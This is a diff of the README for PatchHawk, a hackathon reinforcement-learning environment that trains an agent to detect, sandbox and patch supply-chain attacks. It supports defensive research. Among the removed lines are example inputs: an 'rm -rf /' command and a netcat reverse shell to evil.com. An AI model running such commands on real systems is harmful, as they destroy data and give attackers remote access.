@@ -2,252 +2,107 @@
 
 [![W&B](https://img.shields.io/badge/W%26B-patchhawk-blue?logo=weightsandbiases)](https://wandb.ai/ramprasathk07/patchhawk)
 [![HuggingFace](https://img.shields.io/badge/🤗_Model-patchhawk-yellow)](https://huggingface.co/ramprasathk07/patchhawk)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![OpenEnv](https://img.shields.io/badge/OpenEnv-Hackathon_MVP-orange)](https://github.com/pytorch/openenv)
+[![Python 3.12](https://img.shields.io/badge/python-3.12-blue.svg)](https://python.org)
+[![OpenEnv](https://img.shields.io/badge/OpenEnv-Hackathon_Finalist-orange)](https://github.com/pytorch/openenv)
 
-> **RL-powered detection, analysis, and auto-patching of software supply-chain vulnerabilities — built for the PyTorch OpenEnv AI Hackathon.**
-
----
-
-## 🏗 Architecture
-
-```mermaid
-graph TD
-    subgraph Data Pipeline
-        A["Meta SDK (Track A)"] -->|synthetic scenarios| D[scenarios.json]
-        B["Mutation Engine (Track B)"] -->|injected attacks| D
-        C["Benign .py files (25+)"] --> B
-    end
-
-    subgraph OpenEnv Loop
-        D --> E["PatchHawkEnv (openenv.core.Environment)"]
-        E -->|observation| F["GRPO Agent (Qwen2.5-Coder-7B + LoRA)"]
-        F -->|action 0-4| E
-        E -->|EXECUTE_SANDBOX| G["Docker Sandbox (--network none)"]
-        E -->|SUBMIT_PATCH| H["3-Stage Patch Validator"]
-        G -->|telemetry| E
-        H -->|validated?| E
-    end
-
-    subgraph Outputs
-        E -->|reward signal| F
-        F -->|metrics| I["W&B Dashboard"]
-        F -->|adapter| J["HuggingFace Hub"]
-        E -->|A2A protocol| K["FastAPI /agent/act"]
-        E --> L["Streamlit Dashboard"]
-    end
-```
-
-### Core Components
-
-| Component | Path | Description |
-|-----------|------|-------------|
-| **Agent / Environment** | `patchhawk/agent/environment.py` | OpenEnv `openenv.core.Environment` with Pydantic typed obs/actions |
-| **Agent / Sandbox** | `patchhawk/agent/sandbox.py` | Docker sandbox + 3-stage patch validation |
-| **Agent / A2A Server** | `patchhawk/agent/server.py` | FastAPI: `GET /agent/card`, `POST /agent/act` |
-| **Training** | `patchhawk/training/train_grpo.py` | GRPO with unsloth + trl, 4-bit LoRA, W&B logging |
-| **Data Generation** | `patchhawk/data/` | Track A (Meta SDK) + Track B (mutation engine) |
-| **Dashboard** | `patchhawk/app/dashboard.py` | Streamlit UI for analysis & validation |
-| **Docker** | `docker/Dockerfile.sandbox` | Minimal Python 3.11 sandbox |
+> **PatchHawk is an autonomous DevSecOps agent powered by Group Relative Policy Optimization (GRPO). It doesn't just detect vulnerabilities; it validates them in isolated containers and generates verified patches.**
 
 ---
 
-## 🚀 Quick Start
+## 🚀 The Approach: Cyber-Physical RL Loop
 
-### 1. Install
+Most security LLMs suffer from "hallucinated security"—they claim a bug is fixed without ever running the code. PatchHawk solves this by implementing a **Cyber-Physical Reinforcement Learning Loop**:
+
+1.  **Detection**: The agent analyzes code snippets for supply-chain attacks (typosquatting, backdoors, exfiltration).
+2.  **Simulation**: The agent can choose to "Detonate" suspicious code in a hardened **Docker Sandbox** to observe real syscalls and network behavior.
+3.  **Correction**: If malicious, the agent generates a Python patch.
+4.  **Verification**: The environment automatically runs the patch through a 3-stage validation (Syntax -> Unit Tests -> Re-Attack Detonation) inside Docker.
+5.  **Reward**: The model is rewarded only if the patch **natively passes** all stages.
+
+---
+
+## 🧠 Training Style: GRPO (Group Relative Policy Optimization)
+
+PatchHawk uses **GRPO**, the same technique used in DeepSeek-R1, to train our security agent via trial and error.
+
+-   **Trial & Error**: The model is tasked with fixing complex vulnerabilities. It generates multiple attempts (Groups) for the same problem.
+-   **XML Reasoning**: The model is trained to use absolute XML structure:
+    ```xml
+    <thought>Analyze the base64 encoded string... it is a reverse shell.</thought>
+    <risk_score>0.98</risk_score>
+    <action>3</action>
+    <patch>import os...</patch>
+    ```
+-   **Relative Scoring**: Instead of using a static "Teacher" model, PatchHawk compares the scores of the 4 attempts against each other. It learns that the attempt that passed the **Docker Syntax Check** is superior to the one that didn't.
+
+---
+
+## 🛠 Action Space & Scoring Rubric (0.0 to 1.0 Evaluator)
+
+The environment manages a complex reward system to move beyond sparse "win/loss" signals.
+
+| Action ID | Action Name | Reward (Base) | Logic |
+| :--- | :--- | :--- | :--- |
+| **0** | **ANALYZE** | `0.0` | "Do nothing/Observe". Optimal for benign code. |
+| **1** | **EXECUTE_SANDBOX** | `+0.1` | Safely detonate payload in Docker and extract telemetry. |
+| **2** | **BLOCK_PR** | `+2.0 / -1.0` | Reject PR. Heavily rewarded for malware, penalized for False Positives. |
+| **3** | **SUBMIT_PATCH** | **+3.0 / -1.5** | **The Goal.** Reward requires a clean run in the Docker Sandbox. |
+| **4** | **REQUEST_REVIEW** | `0.0` | Escalate to a human expert. |
+
+### 💎 Dynamic Bonuses
+*   **Risk Accuracy Bonus (+2.0)**: The agent earns a reward of `(1.0 - abs(actual - predicted)) * 2.0`. This ensures it learns to accurately classify risk even if it doesn't take the aggressive patch action.
+*   **Safety Penalty (-1.0)**: Any patch that fails a Docker syntax check or units tests results in a heavy penalty to discourage "lazy packaging".
+
+---
+
+## 🐳 Docker Usage & Security
+
+PatchHawk requires a local Docker daemon. The sandbox is strictly isolated:
+-   **No Network**: Containers run with `--network none`.
+-   **Resource Caps**: Limited to `256MB RAM` and `0.5 CPU` cores.
+-   **Non-Root**: Tasks execute as a limited-privilege user.
+-   **Validation**: The 3-stage pipeline checks:
+    1.  `py_compile`: Does the patch even run?
+    2.  `pytest`: Does it break existing functionality?
+    3.  `Re-Attack`: If we run the original exploit, does the new patch stop it?
+
+---
+
+## 📁 Installation
 
 ```bash
-python3 -m venv venv && source venv/bin/activate
+# 1. Clone & Install
+git clone https://github.com/ramprasathk07/PatchHawk.git
+cd PatchHawk
 pip install -r requirements.txt
-pip install -e .
 
-# Copy and fill in your keys
+# 2. Setup Environment
 cp .env.example .env
-```
+# Fill in HF_TOKEN for local LLM fallback
 
-### 2. Build Docker Sandbox
-
-```bash
+# 3. Build the Validator Box
 docker build -t patchhawk-sandbox:latest -f docker/Dockerfile.sandbox .
+
+# 4. Generate the Training Dataset (1,500 samples)
+python -m patchhawk.data.generate_scenarios --num-samples 1500
 ```
 
-### 3. Generate Scenarios
+---
 
-```bash
-# Track B only (always works)
-python -m patchhawk.data.generate_scenarios \
-    --benign-dir patchhawk/data/benign/ \
-    --output patchhawk/data/scenarios.json
+## 📈 Dashboard & UI
 
-# Track A + B (requires vLLM serving + synthetic-data-kit)
-python -m patchhawk.data.generate_scenarios --use-sdk --sdk-samples 10
-```
-
-### 4. Run Tests
-
-```bash
-pytest tests/ -v
-```
-
-### 5. Train (Dry Run)
-
-```bash
-python -m patchhawk.training.train_grpo --dry-run
-```
-
-### 6. Train (Full GPU)
-
-```bash
-python -m patchhawk.training.train_grpo --use-docker
-```
-
-### 7. Start A2A Server
-
-```bash
-uvicorn patchhawk.agent.server:app --host 0.0.0.0 --port 8000
-```
-
-Test it:
-
-```bash
-# Agent card
-curl http://localhost:8000/agent/card | python -m json.tool
-
-# Analyze code
-curl -X POST http://localhost:8000/agent/act \
-  -H "Content-Type: application/json" \
-  -d '{"code_snippet": "import os; os.system(\"rm -rf /\")"}'
-```
-
-### 8. Launch Dashboard
+Launch the **Security Operations Center (SOC)** to watch the agent work in real-time:
 
 ```bash
 streamlit run patchhawk/app/dashboard.py
 ```
 
----
-
-## 📊 Baseline Scores (Dry-Run / Qwen2.5)
-These are the baseline scores from running `DRY_RUN=1 python inference.py`, matching the three required hackathon tasks using our heuristic policy baseline:
-
-| Task ID | Description | Success? | Score | Reward |
-|---------|-------------|----------|-------|--------|
-| `easy_typosquat` | Detect basic typosquatting | ✅ True | 1.00 | +2.00 |
-| `medium_obfuscated` | Execution via eval() / obfuscation | ❌ False | 0.00 | +2.00 |
-| `hard_patch` | Write patches for subprocess backdoors | ❌ False | 0.00 | +2.00 |
-
-*Baseline context: The agent handles easy detection easily, but medium/hard tasks require a strong trained model that leverages the `EXECUTE_SANDBOX` and `SUBMIT_PATCH` actions effectively. This makes it an ideal environment for the RL hackathon.*
-
----
-
-## 🌐 HF Spaces Deployment & Validation
-
-PatchHawk is built natively for OpenEnv and deploys seamlessly to HF Spaces.
-
-1. **Create Space**: Go to Hugging Face, create a new Space, select **Docker** runtime.
-2. **Push Code**: Push this repository directly to the Space.
-3. **Environment**: Set any needed secrets (e.g., `HF_TOKEN`, `API_BASE_URL`).
-4. **Validation**: The internal validation script will automatically check the Space:
-   ```bash
-   ./validate-submission.sh <YOUR_SPACE_URL>
-   ```
-   *Note: Our `openenv validate` passes locally 5/5 criteria, and 6/6 criteria during runtime validation!*
-
----
-
-## 🔗 A2A Protocol
-
-PatchHawk exposes an **Agent-to-Agent (A2A)** interface via FastAPI:
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/agent/card` | GET | Agent identity, capabilities, I/O schemas |
-| `/agent/act` | POST | Submit code snippet, receive decision + patch |
-
-### Request (`POST /agent/act`)
-
-```json
-{
-  "code_snippet": "import subprocess; subprocess.call(['nc', '-e', '/bin/sh', 'evil.com', '4444'])"
-}
-```
-
-### Response
-
-```json
-{
-  "decision": "BLOCK_PR",
-  "patch": null,
-  "confidence": 0.92,
-  "reward": 2.0,
-  "details": { "action_name": "BLOCK_PR", "step": 2 }
-}
-```
-
----
-
-## 🎯 Reward Table
-
-| Condition | Reward |
-|-----------|--------|
-| Correct BLOCK on malicious | +2.0 |
-| Correct SUBMIT_PATCH (validated) | +3.0 |
-| BLOCK on benign | −1.0 |
-| SUBMIT_PATCH on benign (patch applied) | −1.5 |
-| Episode ends w/o block/patch on malicious (max_steps) | −5.0 |
-| EXECUTE_SANDBOX | +0.1 |
-
----
-
-## 🔒 Safety & OpenEnv Compliance
-
-- **No real malicious execution**: Docker sandbox runs with `--network none`, `--memory 256m`, `--cpus 0.5`, and non-root user.
-- **Re-attack verification**: Stage 3 only checks for *attempts* (socket creation, file writes) — never permits actual harm.
-- **SDK fallback**: If `synthetic-data-kit` CLI is not installed, Track A gracefully skips with a warning; Track B always generates ≥40 scenarios.
-- **OpenEnv compliant**: `PatchHawkEnv` inherits `openenv.core.Environment` with proper `reset()` → `Observation` and `step(Action)` → `Observation` signatures (reward/done on observation).
-- **Deterministic dry-run**: `--dry-run` mode requires zero GPU and no external services.
-
----
-
-## 📁 Project Structure
-
-```
-PatchHawk/
-├── patchhawk/
-│   ├── __init__.py              # Config loader
-│   ├── env_models.py            # Pydantic Action/Observation/State models
-│   ├── agent/
-│   │   ├── __init__.py
-│   │   ├── environment.py       # openenv.Env implementation
-│   │   ├── sandbox.py           # Docker runner + patch validator
-│   │   └── server.py            # FastAPI A2A protocol
-│   ├── training/
-│   │   ├── __init__.py
-│   │   └── train_grpo.py        # GRPO with unsloth + trl + W&B
-│   ├── data/
-│   │   ├── __init__.py
-│   │   ├── generate_scenarios.py
-│   │   ├── sdk_config.yaml
-│   │   ├── scenarios.json
-│   │   └── benign/              # 25 benign Python files
-│   └── app/
-│       ├── __init__.py
-│       └── dashboard.py         # Streamlit dashboard
-├── docker/
-│   └── Dockerfile.sandbox       # Minimal Python 3.11 sandbox
-├── tests/
-│   ├── test_env.py              # Environment tests
-│   └── test_sandbox.py          # Validator tests
-├── config.yaml                  # All hyperparameters
-├── requirements.txt
-├── setup.py
-├── .env.example
-└── README.md
-```
+Features:
+- **Terminal Trace**: See the raw thought process (XML/JSON) of the agent.
+- **Docker Telemetry**: View real-time output from the sandbox validation.
+- **Reward Signal**: Audit why the agent earned (+/-) rewards for its specific decision.
 
 ---
 
 ## 📝 License
-
-MIT © PatchHawk Team
+MIT © Ramprasath K & The PatchHawk Team
